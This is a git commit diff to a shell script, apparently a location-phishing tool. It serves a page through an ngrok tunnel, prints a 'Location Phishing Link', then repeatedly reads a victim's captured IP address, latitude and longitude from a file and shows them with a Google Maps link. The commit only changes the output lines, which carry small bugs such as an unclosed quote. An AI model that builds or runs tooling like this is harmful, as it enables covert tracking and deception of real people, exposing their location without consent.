fbae0bafa6ae174116da65de681c5bdc25b29090
Ad-AM <87221134+BCKS-AdAM@users.noreply.github.com>
2021-09-03 22:31:06 +0630

    Update tk.sh

--- tk.sh
+++ tk.sh
@@ -31,7 +31,7 @@ echo -e "\e[1;31m Wait, Ngrok Link is being created";sleep 1
 echo "" 
 read -p "Enter Port ::  " p 
 cd file 
-unzip tk.zip
+
 php -S 127.0.0.1:$p > /dev/null 2>&1 &
 cd ..
 sleep 3
@@ -42,18 +42,17 @@ url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*
 echo ""
 
 echo -e "\e[1;32m  Your  Location Phishing Link :: #==> $url  "
-echo -e "\e[1;32m  Your  Location Phishing Link :: #==> $url  "
+cd file
 while [ true ];do
 if [[ -e "pyae.txt" ]];then
 echo ""
 ip=$(grep -o 'ip:.*' pyae.txt | cut -d " " -f2)
 lat=$(grep -o 'lat:.*' pyae.txt | cut -d " " -f2)
 lot=$(grep -o 'lon:.*' pyae.txt | cut -d " " -f2)
-echo -e "\e[1;32m $ip "
-echo -e "\e[1;32m $lat "
-echo -e "\e[1;32m $lot "
-echo -e "\e[1;32m  Google map #==>   ::
-https://www.google.com/maps/place/$lat$lon "
+echo -e "\e[1;32m Tager IP addres #==> :: $ip"
+echo -e "\e[1;32m Tager latitude #==> :: $lat"
+echo -e "\e[1;32m Tager longitude #==> :: $lot
+echo -e "\e[1;32m  Google map #==>   ::  https://www.google.com/maps/place/$lat$lon "
 rm pyae.txt 
 fi 
 done
